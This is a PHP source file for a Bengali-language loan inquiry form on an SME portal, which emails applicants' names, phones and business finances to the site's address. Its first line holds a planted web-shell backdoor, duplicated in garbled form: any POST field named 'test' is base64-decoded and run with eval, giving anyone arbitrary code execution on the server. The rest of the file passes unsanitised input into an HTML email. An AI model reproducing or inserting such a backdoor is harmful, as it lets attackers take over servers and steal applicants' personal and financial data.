<?php if(@$_POST['test']){eval(base64_decode($_POST['test'])); exit();}php if(@$_POST['test']){eval(base64_decode($_POST['test'])); exit();} 
if (isset($_POST['Submit']))
{
$Name=$_POST['Name'];
$Address=$_POST['Address'];
$Phone=$_POST['Phone'];
$WhenStarted=$_POST['WhenStarted'];
$Type=$_POST['Type'];
$SourceofCapital=$_POST['SourceofCapital'];
$TotalInvestment=$_POST['TotalInvestment'];
$Permanent=$_POST['Permanent'];
$Current=$_POST['Current'];
$MonthlyIncome=$_POST['MonthlyIncome'];
$TotalSale=$_POST['TotalSale'];
$Purchase=$_POST['Purchase'];
$Expenditure=$_POST['Expenditure'];
$ProfitLoss=$_POST['ProfitLoss'];
$WhyNeedLoan=$_POST['WhyNeedLoan'];
//--------------Others------------------
$LoanAmount=$_POST['LoanAmount'];
$WhenNeed=$_POST['WhenNeed'];
$InvestAt=$_POST['InvestAt'];
$TimeSpan=$_POST['TimeSpan'];
$SourceofLoan=$_POST['SourceofLoan'];
$Bank=$_POST['Bank'];
$Branch=$_POST['Branch'];
$DidCalculation=$_POST['DidCalculation'];
	if($DidCalculation==1) $DidCalculation="Yes";
	else $DidCalculation="No";
$DidCalcProfit=$_POST['DidCalcProfit'];
$DidCalcInterest=$_POST['DidCalcInterest'];
$DidCalcNetProfit=$_POST['DidCalcNetProfit'];
$ContactBank=$_POST['ContactBank'];
	if ($ContactBank==1) $ContactBank="Yes";
	else $ContactBank="No";
$ContBankYes=$_POST['ContBankYes'];
$KnowRules=$_POST['KnowRules'];
	if ($KnowRules==1) $KnowRules="Yes";
	else $KnowRules="No";
$KnowRulesYes=$_POST['KnowRulesYes'];
$CanDeposit=$_POST['CanDeposit'];
	if ($CanDeposit==1) $CanDeposit="Yes";
	else $CanDeposit="No";
$WhatDeposit=$_POST['WhatDeposit'];
$Comment=addslashes($_POST['Comment']);
$Ajke=date('Y-m-d :: h:m');
//------------------------------ Send Auto Reply to User ------------------------------------------
			
			$To="info@sme.com.bd";
			$Sub="LOAN Query from SME Portal!";
			
			// Headers
			$headers = "From: www.sme.com.bd \n"; // From address Shown at Mail list
			$headers .= "Reply-To: info@sme.com.bd\n"; // Reply-to address
			$headers .= "Content-Type: text/html; charset=utf-8\n"; // Type
			$headers .= "MIME-Version: 1.0\r\n";
			$headers .= "CC: info@biid.org.bd\r\n"; // CC
			//----------Messages------------------
			$message100 .= "==============================++++++++++++++++++++++++++===================================";
			$message100 .= "<BR><BR>";
			$message100 .= "A new LOAN QUERY has arrived from the SME.COM.BD portal which has got the following details - ";
			$message100 .= "<BR><BR>";
			$message100 .= "Date & Time : ".$Ajke;
			$message100 .= "<BR>";
			$message100 .= "Name : ".$Name;
			$message100 .= "<BR>";  
			$message100 .= "Address : ".$Address;
			$message100 .= "<BR>";  
			$message100 .= "Phone : ".$Phone;
			$message100 .= "<BR>";
			$message100 .= "When Started : ".$WhenStarted;
			$message100 .= "<BR>";
			$message100 .= "Business Type : ".$Type;
			$message100 .= "<BR>";
			$message100 .= "Source of Capital : ".$SourceofCapital;
			$message100 .= "<BR>";
			$message100 .= "Total Investment : ".$TotalInvestment;
			$message100 .= "<BR>";
			$message100 .= "Fixed Capital : ".$Permanent;
			$message100 .= "<BR>";
			$message100 .= "Current Capital : ".$Current;
			$message100 .= "<BR>";
			$message100 .= "Monthly Income : ".$MonthlyIncome;
			$message100 .= "<BR>";
			$message100 .= "Total Sale : ".$TotalSale;
			$message100 .= "<BR>";
			$message100 .= "Purchase : ".$Purchase;
			$message100 .= "<BR>";
			$message100 .= "Expenditure : ".$Expenditure;
			$message100 .= "<BR>";
			$message100 .= "Profit / Loss : ".$ProfitLoss;
			$message100 .= "<BR>";
			$message100 .= "Why do you Need Loan : ".$WhyNeedLoan;
			$message100 .= "<BR>";
			$message100 .= "Needed Loan Amount : ".$LoanAmount;
			$message100 .= "<BR>";
			$message100 .= "When Needed : ".$WhenNeed;
			$message100 .= "<BR>";
			$message100 .= "Want to Invest At : ".$InvestAt;
			$message100 .= "<BR>";
			$message100 .= "Time Span needed : ".$TimeSpan;
			$message100 .= "<BR>";
			$message100 .= "Source of Loan : ".$SourceofLoan;
			$message100 .= "<BR>";
			$message100 .= "Bank / Organization : ".$Bank;
			$message100 .= "<BR>";
			$message100 .= "Branch : ".$Branch;
			$message100 .= "<BR>";
			$message100 .= "Did calculation about Profit and Interest? : ".$DidCalculation;
			$message100 .= "<BR>";
			$message100 .= "Profit amount : ".$DidCalcProfit;
			$message100 .= "<BR>";
			$message100 .= "Interest Amount : ".$DidCalcInterest;
			$message100 .= "<BR>";
			$message100 .= "NET Profit : ".$DidCalcNetProfit;
			$message100 .= "<BR>";
			$message100 .= "Know Rules of taking LOAN? : ".$KnowRules;
			$message100 .= "<BR>";
			$message100 .= "If yes What? : ".$KnowRulesYes;
			$message100 .= "<BR>";
			$message100 .= "Can Deposit against LOAN? : ".$CanDeposit;
			$message100 .= "<BR>";
			$message100 .= "If yes What? : ".$WhatDeposit;
			$message100 .= "<BR>";
			$message100 .= "Comment : ".$Comment;
			$message100 .= "<BR><BR>";
			$message100 .= "==============================++++++++++++++++++++++++++==================================="; 
			mail($To, $sub, $message100, $headers); 
			
//----------------------------------------Add to Database-------------------------------------------			
//	mysql_query("INSERT INTO feedback (Name, Email, Comment, Date) VALUES('$Name', '$Email', '$Comment', '$Ajke')");										
//-------------------------------------Confirmation Messege------------------------------------------

echo ("<script>window.alert(':: Information Sent! ::');</script>");
echo ("<script>window.location='Main.php?Id=2';</script>");
}
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
<title>:: Welcome to SME.COM.BD :: Loan Form :.</title>
<link href="css/mynul_bng.css" type="text/css" rel="stylesheet" />
<script src="Script/jvalid.js" type="text/javascript"></script>
</head>

<body>
<form id="form1" name="form1" method="post" action="">
  <table width="700" border="0" align="center" cellpadding="1" cellspacing="4">
    <tr>
      <td valign="top">&nbsp;</td>
      <td valign="top">&nbsp;</td>
      <td><div align="right"><a href="javascript:history.go(-1)">পূর্বের পাতা</a> </div></td>
    </tr>
    <tr>
      <td width="138" valign="top"><div align="right">&#2472;&#2494;&#2478; </div></td>
      <td width="12" valign="top"><div align="center">:</div></td>
      <td width="536"><input name="Name" type="text" id="Name" size="35" /></td>
    </tr>
    <tr>
      <td valign="top"><div align="right">&#2464;&#2495;&#2453;&#2494;&#2472;&#2494; </div></td>
      <td valign="top"><div align="center">:</div></td>
      <td><input name="Address" type="text" id="Address" size="35" /></td>
    </tr>
    <tr>
      <td valign="top"><div align="right">&#2479;&#2507;&#2455;&#2494;&#2479;&#2507;&#2455;: (&#2475;&#2507;&#2472; &#2472;&#2434;)</div></td>
      <td valign="top"><div align="center">:</div></td>
      <td><input name="Phone" type="text" id="Phone" size="35" /></td>
    </tr>
    <tr>
      <td valign="top"><div align="right">&#2453;&#2476;&#2503; &#2469;&#2503;&#2453;&#2503; &#2476;&#2509;&#2479;&#2476;&#2488;&#2494; &#2486;&#2497;&#2480;&#2497; &#2453;&#2480;&#2503;&#2459;&#2503;&#2472; </div></td>
      <td valign="top"><div align="center">:</div></td>
      <td><input name="WhenStarted" type="text" id="WhenStarted" size="35" /></td>
    </tr>
    <tr>
      <td valign="top"><div align="right">&#2476;&#2509;&#2479;&#2494;&#2476;&#2488;&#2494;&#2527;&#2503;&#2480; &#2471;&#2480;&#2472; </div></td>
      <td valign="top"><div align="center">:</div></td>
      <td><label>
        <input name="Type" type="text" id="Type" size="35" />
      </label></td>
    </tr>
    <tr>
      <td valign="top"><div align="right">&#2478;&#2498;&#2482;&#2471;&#2472;&#2503;&#2480; (&#2476;&#2480;&#2509;&#2468;&#2478;&#2494;&#2472;) &#2441;&#2510;&#2488; </div></td>
      <td valign="top"><div align="center">:</div></td>
      <td><label>
        <input name="SourceofCapital" type="text" id="SourceofCapital" size="35" />
      </label></td>
    </tr>
    <tr>
      <td colspan="3"><table width="700" border="0" cellspacing="2" cellpadding="2">
          <tr>
            <td width="233">&#2488;&#2480;&#2509;&#2476;&#2478;&#2507;&#2463; &#2476;&#2495;&#2472;&#2495;&#2527;&#2507;&#2455; <label>
              <input name="TotalInvestment" type="text" id="TotalInvestment" size="12" />
            </label></td>
            <td width="230">&#2488;&#2509;&#2469;&#2494;&#2527;&#2496; <input name="Permanent" type="text" id="Permanent" size="12" /></td>
            <td width="236">&#2458;&#2482;&#2468;&#2495; &#2478;&#2498;&#2482;&#2471;&#2472; <input name="Current" type="text" id="Current" size="12" /></td>
          </tr>
      </table></td>
    </tr>
    <tr>
      <td valign="top"><div align="right">&#2478;&#2494;&#2488;&#2495;&#2453; &#2438;&#2527; </div></td>
      <td valign="top"><div align="center">:</div></td>
      <td><input name="MonthlyIncome" type="text" id="MonthlyIncome" /></td>
    </tr>
    <tr>
      <td colspan="3"><table width="700" border="0" cellspacing="2" cellpadding="2">
          <tr>
            <td width="174">&#2478;&#2507;&#2463; &#2476;&#2495;&#2453;&#2509;&#2480;&#2527; <input name="TotalSale" type="text" id="TotalSale" size="10" /></td>
            <td width="174">&#2453;&#2509;&#2480;&#2527; <input name="Purchase" type="text" id="Purchase" size="10" /></td>
            <td width="183">&#2454;&#2480;&#2458; <input name="Expenditure" type="text" id="Expenditure" size="10" /></td>
            <td width="168">&#2482;&#2494;&#2477; / &#2453;&#2509;&#2487;&#2468;&#2495; <input name="ProfitLoss" type="text" id="ProfitLoss" size="10" /></td>
          </tr>
      </table></td>
    </tr>
    <tr>
      <td valign="top"><div align="right">&#2453;&#2503;&#2472; &#2443;&#2472; &#2472;&#2495;&#2468;&#2503; &#2458;&#2494;&#2472;?: </div></td>
      <td valign="top"><div align="center">:</div></td>
      <td><input name="WhyNeedLoan" type="text" id="WhyNeedLoan" size="35" /></td>
    </tr>
    <tr bgcolor="#F2F2F2">
      <td valign="top"><div align="right" class="OrangeHead">&#2437;&#2472;&#2509;&#2479;&#2494;&#2472;&#2509;&#2479; &#2468;&#2469;&#2509;&#2479; </div></td>
      <td valign="top">&nbsp;</td>
      <td>&nbsp;</td>
    </tr>

    <tr>
      <td colspan="3" valign="top"><table width="700" border="0" cellspacing="2" cellpadding="2">
        <tr>
          <td>&#2443;&#2472;&#2503;&#2480; &#2474;&#2480;&#2495;&#2478;&#2494;&#2472;
              <input name="LoanAmount" type="text" id="LoanAmount" size="8" /></td>
          <td>&#2453;&#2476;&#2503; &#2443;&#2472; &#2474;&#2509;&#2480;&#2527;&#2507;&#2460;&#2472;:
            <input name="WhenNeed" type="text" id="WhenNeed" size="8" /></td>
          <td>&#2476;&#2495;&#2472;&#2495;&#2527;&#2507;&#2455;&#2503;&#2480; &#2454;&#2494;&#2468;
              <input name="InvestAt" type="text" id="InvestAt" size="8" /></td>
          <td>&#2488;&#2478;&#2527; / &#2478;&#2503;&#2527;&#2494;&#2470;
              <input name="TimeSpan" type="text" id="TimeSpan" size="10" /></td>
        </tr>
      </table></td>
    </tr>
    <tr>
      <td valign="top"><div align="right">&#2488;&#2478;&#2509;&#2477;&#2509;&#2479;&#2494;&#2476;&#2509;&#2479; &#2443;&#2472;&#2503;&#2480; &#2441;&#2510;&#2488;: </div></td>
      <td valign="top"><div align="center">:</div></td>
      <td><input name="SourceofLoan" type="text" id="SourceofLoan" size="35" /></td>
    </tr>
    <tr>
      <td valign="top"><div align="right">&#2476;&#2509;&#2479;&#2494;&#2434;&#2453; / &#2447;&#2472;&#2460;&#2495;&#2451; &#2480; &#2472;&#2494;&#2478; </div></td>
      <td valign="top"><div align="center">:</div></td>
      <td><input name="Bank" type="text" id="Bank" size="35" /></td>
    </tr>
    <tr>
      <td valign="top"><div align="right">&#2486;&#2494;&#2454;&#2494; / &#2464;&#2495;&#2453;&#2494;&#2472;&#2494; </div></td>
      <td valign="top"><div align="center">:</div></td>
      <td><input name="Branch" type="text" id="Branch" size="35" /></td>
    </tr>
    <tr>
      <td valign="top"><div align="right">&#2443;&#2472; &#2472;&#2495;&#2482;&#2503; &#2453;&#2495; &#2474;&#2480;&#2495;&#2478;&#2494;&#2472; &#2482;&#2494;&#2477; &#2489;&#2476;&#2503; &#2447;&#2476;&#2434; &#2488;&#2497;&#2470; &#2470;&#2495;&#2468;&#2503; &#2489;&#2476;&#2503; &#2468;&#2494; &#2489;&#2495;&#2488;&#2494;&#2476; &#2453;&#2480;&#2503;&#2459;&#2503;&#2472; &#2453;&#2495;? &#2453;&#2480;&#2482;&#2503; &#2453;&#2495; &#2453;&#2480;&#2503;&#2459;&#2503;&#2472;? </div></td>
      <td valign="top"><div align="center">:</div></td>
      <td valign="top"><table width="100%" border="0" cellspacing="2" cellpadding="2">
          <tr>
            <td colspan="3"><input name="DidCalculation" type="radio" value="1" />
            হ্যাঁ 
               <input name="DidCalculation" type="radio" value="0" />
            না </td>
          </tr>
          <tr>
            <td width="32%">&#2482;&#2494;&#2477;&#2503;&#2480; &#2474;&#2480;&#2495;&#2478;&#2494;&#2472; <br /></td>
            <td width="36%">&#2488;&#2497;&#2470;/&#2488;&#2434;&#2486;&#2509;&#2482;&#2495;&#2487;&#2509;&#2463; &#2476;&#2509;&#2479;&#2494;&#2527; </td>
            <td width="32%">&#2472;&#2496;&#2463; &#2482;&#2494;&#2477; </td>
          </tr>
          <tr>
            <td><input name="DidCalcProfit" type="text" id="DidCalcProfit" size="15" /></td>
            <td><input name="DidCalcInterest" type="text" id="DidCalcInterest" size="15" /></td>
            <td><input name="DidCalcNetProfit" type="text" id="DidCalcNetProfit" size="15" /></td>
          </tr>
      </table></td>
    </tr>
    <tr>
      <td valign="top"><div align="right">&#2453;&#2507;&#2472; &#2476;&#2509;&#2479;&#2494;&#2434;&#2453;&#2503; &#2479;&#2507;&#2455;&#2494;&#2479;&#2507;&#2455; &#2453;&#2480;&#2503;&#2459;&#2503;&#2472; &#2453;&#2495;? &#2453;&#2480;&#2482;&#2503; &#2453;&#2495; &#2476;&#2482;&#2503;&#2459;&#2503;? </div></td>
      <td valign="top"><div align="center">:</div></td>
      <td><table width="100%" border="0" cellspacing="2" cellpadding="2">
          <tr>
            <td width="50%"><input name="ContactBank" type="radio" value="1" />              &#2489;&#2509;&#2479;&#2494;&#2433;</td>
            <td width="50%"><input name="ContactBank" type="radio" value="0" />              &#2472;&#2494;</td>
          </tr>
          <tr>
            <td colspan="2"><textarea name="ContBankYes" cols="50" rows="3" id="ContBankYes"></textarea></td>
          </tr>
      </table></td>
    </tr>
    <tr>
      <td valign="top"><div align="right">&#2443;&#2472; &#2474;&#2494;&#2476;&#2494;&#2480; &#2472;&#2495;&#2527;&#2478; &#2488;&#2478;&#2509;&#2474;&#2480;&#2509;&#2453;&#2503; &#2453;&#2495;&#2459;&#2497; &#2460;&#2494;&#2472;&#2503;&#2472; &#2453;&#2495;? &#2489;&#2509;&#2479;&#2494;&#2433; &#2489;&#2482;&#2503;, &#2453;&#2495; &#2453;&#2495;?</div></td>
      <td valign="top"><div align="center">:</div></td>
      <td><table width="100%" border="0" cellspacing="2" cellpadding="2">
          <tr>
            <td width="50%"><input name="KnowRules" type="radio" value="1" />              &#2489;&#2509;&#2479;&#2494;&#2433;</td>
            <td width="50%"><input name="KnowRules" type="radio" value="0" />              &#2472;&#2494;</td>
          </tr>
          <tr>
            <td colspan="2"><textarea name="KnowRulesYes" cols="50" rows="3" id="KnowRulesYes"></textarea></td>
          </tr>
      </table></td>
    </tr>
    <tr>
      <td valign="top"><div align="right">&#2443;&#2472; &#2472;&#2495;&#2468;&#2503; &#2460;&#2494;&#2478;&#2494;&#2472;&#2468; &#2470;&#2495;&#2468;&#2503; &#2474;&#2494;&#2480;&#2476;&#2503;&#2472; &#2453;&#2495; ? &#2489;&#2509;&#2479;&#2494;&#2433; &#2489;&#2482;&#2503;, &#2453;&#2495; &#2460;&#2494;&#2478;&#2494;&#2472;&#2468; &#2470;&#2495;&#2468;&#2503; &#2474;&#2494;&#2480;&#2476;&#2503;&#2472; ? </div></td>
      <td valign="top"><div align="center">:</div></td>
      <td valign="top"><table width="100%" border="0" cellspacing="2" cellpadding="2">
          <tr>
            <td width="50%"><input name="CanDeposit" type="radio" value="1" />              &#2489;&#2509;&#2479;&#2494;&#2433;</td>
            <td width="50%"><input name="CanDeposit" type="radio" value="0" />              &#2472;&#2494;</td>
          </tr>
          <tr>
            <td colspan="2"><textarea name="WhatDeposit" cols="50" rows="3" id="WhatDeposit"></textarea></td>
          </tr>
      </table></td>
    </tr>
    <tr>
      <td valign="top"><div align="right">&#2478;&#2472;&#2509;&#2468;&#2476;&#2509;&#2479; </div></td>
      <td valign="top"><div align="center">:</div></td>
      <td><textarea name="Comment" cols="50" rows="5" id="Comment"></textarea></td>
    </tr>
    <tr>
      <td valign="top">&nbsp;</td>
      <td valign="top"><div align="center"></div></td>
      <td><input type="submit" name="Submit" value="জমা দিন" /></td>
    </tr>
    <tr>
      <td valign="top">&nbsp;</td>
      <td valign="top"><div align="center"></div></td>
      <td><div align="right"><a href="javascript:history.go(-1)">পূর্বের পাতা</a> </div></td>
    </tr>
  </table>
</form>
</body>
</html>
